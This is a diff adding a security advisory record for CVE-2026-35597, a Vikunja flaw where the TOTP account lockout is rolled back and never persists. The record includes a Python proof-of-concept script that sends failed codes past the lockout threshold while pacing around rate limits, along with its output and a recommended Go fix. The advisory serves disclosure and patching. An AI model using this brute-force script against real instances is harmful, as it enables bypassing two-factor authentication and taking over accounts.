@@ -1,0 +1,62 @@
+{
+  "id": "GHSA-fgfv-pv97-6cmj",
+  "modified": "2026-04-10T19:48:55.107948Z",
+  "published": "2026-04-10T15:34:14Z",
+  "aliases": [
+    "CVE-2026-35597"
+  ],
+  "summary": "Vikunja Vulnerable to TOTP Brute-Force Due to Non-Functional Account Lockout",
+  "details": "## Summary\n\nThe TOTP failed-attempt lockout mechanism is non-functional due to a database transaction handling bug. The account lock is written to the same database session that the login handler always rolls back on TOTP failure, so the lockout is triggered but never persisted. This allows unlimited brute-force attempts against TOTP codes.\n\n## Details\n\nWhen a TOTP validation fails, the login handler at `pkg/routes/api/v1/login.go:95-101` calls `HandleFailedTOTPAuth` and then unconditionally rolls back:\n\n```go\nif err != nil {\n    if user2.IsErrInvalidTOTPPasscode(err) {\n        user2.HandleFailedTOTPAuth(s, user)\n    }\n    _ = s.Rollback()\n    return err\n}\n```\n\n`HandleFailedTOTPAuth` at `pkg/user/totp.go:201-247` uses an in-memory counter (key-value store) to track failed attempts. When the counter reaches 10, it calls `user.SetStatus(s, StatusAccountLocked)` on the same database session `s`. Because the login handler always rolls back after a TOTP failure, the `StatusAccountLocked` write is undone.\n\nThe in-memory counter correctly increments past 10, so the lockout code executes on every subsequent attempt, but the database write is rolled back every time.\n\n## Proof of Concept\n\nTested on Vikunja v2.2.2. Requires `pyotp` (`pip install pyotp`).\n\n```python\nimport requests, time, pyotp\n\nTARGET = \"http://localhost:3456\"\nAPI = f\"{TARGET}/api/v1\"\n\ndef h(token):\n    return {\"Authorization\": f\"Bearer {token}\", \"Content-Type\": \"application/json\"}\n\n# setup: login, enroll and enable TOTP\ntoken = requests.post(f\"{API}/login\",\n    json={\"username\": \"totp_user\", \"password\": \"TotpUser1!\"}).json()[\"token\"]\nsecret = requests.post(f\"{API}/user/settings/totp/enroll\", headers=h(token)).json()[\"secret\"]\ntotp = pyotp.TOTP(secret)\nrequests.post(f\"{API}/user/settings/totp/enable\", headers=h(token),\n              json={\"passcode\": totp.now()})\n\n# send 9 failed attempts (rate limit is 10/min)\nfor i in range(1, 10):\n    r = requests.post(f\"{API}/login\",\n        json={\"username\": \"totp_user\", \"password\": \"TotpUser1!\", \"totp_passcode\": \"000000\"})\n    print(f\"Attempt {i}: {r.status_code} code={r.json().get('code')}\")\n\n# wait for rate limit reset, send 3 more (past the 10-attempt lockout threshold)\ntime.sleep(65)\nfor i in range(10, 13):\n    r = requests.post(f\"{API}/login\",\n        json={\"username\": \"totp_user\", \"password\": \"TotpUser1!\", \"totp_passcode\": \"000000\"})\n    print(f\"Attempt {i}: {r.status_code} code={r.json().get('code')}\")\n\n# wait for rate limit, try with valid TOTP\ntime.sleep(65)\nr = requests.post(f\"{API}/login\",\n    json={\"username\": \"totp_user\", \"password\": \"TotpUser1!\", \"totp_passcode\": totp.now()})\nprint(f\"Valid TOTP login: {r.status_code}\")  # 200 - account was never locked\n```\n\nOutput:\n```\nAttempt 1: 412 code=1017\n...\nAttempt 9: 412 code=1017\nAttempt 10: 412 code=1017\nAttempt 11: 412 code=1017\nAttempt 12: 412 code=1017\nValid TOTP login: 200\n```\n\nThe account was never locked despite exceeding the 10-attempt threshold. The per-IP rate limit of 10 requests/minute requires spacing attempts, but an attacker with multiple source IPs can parallelize.\n\n## Impact\n\nAn attacker who has obtained a user's password (via phishing, credential stuffing, or database breach) can bypass TOTP two-factor authentication by brute-forcing 6-digit codes. The intended account lockout after 10 failed attempts never takes effect. While per-IP rate limiting provides friction, a distributed attacker can exhaust the TOTP code space.\n\n## Recommended Fix\n\nHave `HandleFailedTOTPAuth` create and commit its own independent database session for the lockout operation:\n\n```go\n// Use a new session so the lockout persists regardless of caller's rollback\nlockoutSession := db.NewSession()\ndefer lockoutSession.Close()\nerr = user.SetStatus(lockoutSession, StatusAccountLocked)\nif err != nil {\n    _ = lockoutSession.Rollback()\n    return\n}\n_ = lockoutSession.Commit()\n```\n\n---\n*Found and reported by [aisafe.io](https://aisafe.io)*",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.vikunja.io/api",
+        "purl": "pkg:golang/code.vikunja.io/api"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.3.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.2.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-fgfv-pv97-6cmj/GHSA-fgfv-pv97-6cmj.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-fgfv-pv97-6cmj"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-35597"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/pull/2576"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/commit/6ca0151d02fa0e8c7e2181ab916a28e08caaaec8"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-vikunja/vikunja"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0"
+    }
+  ]
+}
